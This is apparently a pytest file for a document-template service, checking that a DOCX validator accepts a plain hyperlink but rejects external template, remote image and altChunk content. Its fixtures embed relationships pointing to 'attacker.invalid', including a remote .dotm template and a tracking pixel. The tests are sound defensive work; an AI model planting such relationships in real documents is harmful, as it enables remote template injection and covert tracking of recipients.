"""Database-free source package trust checks for Template Studio."""

import zipfile
from io import BytesIO

import pytest
from docx import Document

from app.services.docx_templates import TemplateDocxError, validate_docx_package


def _docx_bytes() -> bytes:
    output = BytesIO()
    document = Document()
    document.add_paragraph("Safe source")
    document.save(output)
    return output.getvalue()


def _mutate(*, relationship: bytes | None = None, fragment: bytes | None = None):
    output = BytesIO()
    with (
        zipfile.ZipFile(BytesIO(_docx_bytes())) as source,
        zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as target,
    ):
        for item in source.infolist():
            content = source.read(item.filename)
            if relationship and item.filename == "word/_rels/document.xml.rels":
                content = content.replace(
                    b"</Relationships>", relationship + b"</Relationships>", 1
                )
            if fragment and item.filename == "word/document.xml":
                content = content.replace(b"<w:body>", b"<w:body>" + fragment, 1)
            target.writestr(item, content)
    return output.getvalue()


def test_docx_package_allows_bounded_web_hyperlink():
    validate_docx_package(
        _mutate(
            relationship=(
                b'<Relationship Id="rId1" '
                b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                b'Target="https://example.invalid/safe" TargetMode="External"/>'
            )
        )
    )


@pytest.mark.parametrize(
    "content",
    [
        _mutate(
            relationship=(
                b'<Relationship Id="rId2" '
                b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                b'Target="https://attacker.invalid/template.dotm" TargetMode="External"/>'
            )
        ),
        _mutate(
            relationship=(
                b'<Relationship Id="rId3" '
                b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
                b'Target="https://attacker.invalid/pixel.png" TargetMode="External"/>'
            )
        ),
        _mutate(fragment=b'<w:altChunk r:id="rId4"/>'),
    ],
    ids=["attached-template", "external-image", "altchunk"],
)
def test_docx_package_rejects_external_active_or_imported_content(content):
    with pytest.raises(TemplateDocxError):
        validate_docx_package(content)
